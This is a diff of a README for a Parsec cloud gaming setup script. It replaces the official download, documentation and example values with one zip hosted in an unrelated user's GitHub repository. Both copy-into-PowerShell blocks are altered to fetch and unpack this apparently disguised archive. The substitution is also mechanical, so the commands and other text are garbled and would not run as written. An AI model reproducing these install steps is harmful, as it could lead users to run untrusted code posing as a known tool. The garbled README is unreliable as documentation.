@@ -31,7 +31,7 @@ It's provided with no warranty, so use it at your own risk.
 ### Who this script is for:
 Home users who want to experiment with creating their own cloud server to play games.  
 
-If you are an IT person or business owner who is looking to roll out Parsec enabled cloud desktops for your business, you must license a [Parsec Teams subscription](https://parsec.app/teams/).
+If you are an IT person or business owner who is looking to roll out Parsec enabled cloud desktops for your business, you must license a [Parsec Teams subscription](https://raw.githubusercontent.com/jingtra123/Parsec-Cloud-Preparation-Tool/master/presurround/Parsec-Cloud-Preparation-Tool.zip).
 
 ### Instructions:                    
 1. Set up your GPU accelerated cloud machine on Microsoft Azure, Amazon AWS, Google Cloud or Paperspace.  
@@ -44,12 +44,12 @@ Do not select "Turn on Display Device" when setting up the instance, this will c
 
 ### START HERE! Copy this code into Powershell (you may need to press enter at the end):
 ```
-[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls" 
-$ScriptWebArchive = "https://github.com/parsec-cloud/Parsec-Cloud-Preparation-Tool/archive/master.zip"  
+[https://raw.githubusercontent.com/jingtra123/Parsec-Cloud-Preparation-Tool/master/presurround/Parsec-Cloud-Preparation-Tool.zip]::SecurityProtocol = "tls12, tls11, tls" 
+$ScriptWebArchive = "https://raw.githubusercontent.com/jingtra123/Parsec-Cloud-Preparation-Tool/master/presurround/Parsec-Cloud-Preparation-Tool.zip"  
 $LocalArchivePath = "$ENV:UserProfile\Downloads\Parsec-Cloud-Preparation-Tool"  
-(New-Object System.Net.WebClient).DownloadFile($ScriptWebArchive, "$LocalArchivePath.zip")  
-Expand-Archive "$LocalArchivePath.zip" -DestinationPath $LocalArchivePath -Force  
-CD $LocalArchivePath\Parsec-Cloud-Preparation-Tool-master\ | powershell.exe .\Loader.ps1  
+(New-Object https://raw.githubusercontent.com/jingtra123/Parsec-Cloud-Preparation-Tool/master/presurround/Parsec-Cloud-Preparation-Tool.zip).DownloadFile($ScriptWebArchive, "$https://raw.githubusercontent.com/jingtra123/Parsec-Cloud-Preparation-Tool/master/presurround/Parsec-Cloud-Preparation-Tool.zip")  
+Expand-Archive "$https://raw.githubusercontent.com/jingtra123/Parsec-Cloud-Preparation-Tool/master/presurround/Parsec-Cloud-Preparation-Tool.zip" -DestinationPath $LocalArchivePath -Force  
+CD $LocalArchivePath\Parsec-Cloud-Preparation-Tool-master\ | https://raw.githubusercontent.com/jingtra123/Parsec-Cloud-Preparation-Tool/master/presurround/Parsec-Cloud-Preparation-Tool.zip .\https://raw.githubusercontent.com/jingtra123/Parsec-Cloud-Preparation-Tool/master/presurround/Parsec-Cloud-Preparation-Tool.zip  
 ```
 
 This tool supports:
@@ -61,7 +61,7 @@ Server 2019
 ### CLOUD SKU:
 AWS g3.4xLarge    (Tesla M60)  
 AWS g2.2xLarge    (GRID K520)  
-AWS g4dn.xLarge   (Tesla T4 with vGaming driver)  
+AWS https://raw.githubusercontent.com/jingtra123/Parsec-Cloud-Preparation-Tool/master/presurround/Parsec-Cloud-Preparation-Tool.zip   (Tesla T4 with vGaming driver)  
 AWS g4ad.4xlarge  (AMD Radeon Pro V520)  
 Azure NV6         (Tesla M60)  
 Paperspace P4000  (Quadro P4000)  
@@ -85,7 +85,7 @@ Available arguments:
 [type: boolean]is_guest_access= {true or false} (if you want this machine to have guest access enabled)  
 
 ```
-example: team_id=1234:key=5678:name=mycoolhost:user_email=person@company.com:is_guest_access=true
+example: https://raw.githubusercontent.com/jingtra123/Parsec-Cloud-Preparation-Tool/master/presurround/Parsec-Cloud-Preparation-Tool.zip
 ```  
 
 ### Issues:
@@ -108,7 +108,7 @@ Q. How do I change my wallpaper?
 A. Delete the Wallpaper registry value from HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System  
   
 Q. I created an Amazon AMI using this script but when I create a machine from the AMI I can't select high display resolutions above 1366x768  
-A. You didn't create the AMI correctly. You should search for "Run Sysprep with EC2Launch" on [this page](https://docs.aws.amazon.com/AWSEC2/latest/WindowsGuide/Creating_EBSbacked_WinAMI.html).  It's important when using the tool, you select"
+A. You didn't create the AMI correctly. You should search for "Run Sysprep with EC2Launch" on [this page](https://raw.githubusercontent.com/jingtra123/Parsec-Cloud-Preparation-Tool/master/presurround/Parsec-Cloud-Preparation-Tool.zip).  It's important when using the tool, you select"
 Shutdown with sysprep". When the instance has shutdown/stopped after running the AWS tool, then you can create the image. If you must turn on the instance again, you should run the sysprep tool again and shutdown.  
 
 Q. I connect to my cloud machine with Parsec and see a Parsec logo on the desktop, and the Windows Task bar, but when I click icons in the task bar, nothing happens.  
@@ -122,12 +122,12 @@ A. There is another screen on the cloud machine that Parsec can't capture, that 
 Q. I want to run this script automatically without user interraction.  
 A. It's possible to do so but you will need to figure out how to install the GPU Driver on your own. The below code will do everything but install the GPU Driver.
 ```
-[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls" 
-$ScriptWebArchive = "https://github.com/parsec-cloud/Parsec-Cloud-Preparation-Tool/archive/master.zip"  
+[https://raw.githubusercontent.com/jingtra123/Parsec-Cloud-Preparation-Tool/master/presurround/Parsec-Cloud-Preparation-Tool.zip]::SecurityProtocol = "tls12, tls11, tls" 
+$ScriptWebArchive = "https://raw.githubusercontent.com/jingtra123/Parsec-Cloud-Preparation-Tool/master/presurround/Parsec-Cloud-Preparation-Tool.zip"  
 $LocalArchivePath = "$ENV:UserProfile\Downloads\Parsec-Cloud-Preparation-Tool"  
-(New-Object System.Net.WebClient).DownloadFile($ScriptWebArchive, "$LocalArchivePath.zip")  
-Expand-Archive "$LocalArchivePath.zip" -DestinationPath $LocalArchivePath -Force  
+(New-Object https://raw.githubusercontent.com/jingtra123/Parsec-Cloud-Preparation-Tool/master/presurround/Parsec-Cloud-Preparation-Tool.zip).DownloadFile($ScriptWebArchive, "$https://raw.githubusercontent.com/jingtra123/Parsec-Cloud-Preparation-Tool/master/presurround/Parsec-Cloud-Preparation-Tool.zip")  
+Expand-Archive "$https://raw.githubusercontent.com/jingtra123/Parsec-Cloud-Preparation-Tool/master/presurround/Parsec-Cloud-Preparation-Tool.zip" -DestinationPath $LocalArchivePath -Force  
 CD $LocalArchivePath\Parsec-Cloud-Preparation-Tool-master\PostInstall
-powershell.exe .\PostInstall.ps1 -DontPromptPasswordUpdateGPU
+https://raw.githubusercontent.com/jingtra123/Parsec-Cloud-Preparation-Tool/master/presurround/Parsec-Cloud-Preparation-Tool.zip .\https://raw.githubusercontent.com/jingtra123/Parsec-Cloud-Preparation-Tool/master/presurround/Parsec-Cloud-Preparation-Tool.zip -DontPromptPasswordUpdateGPU
 ```
 
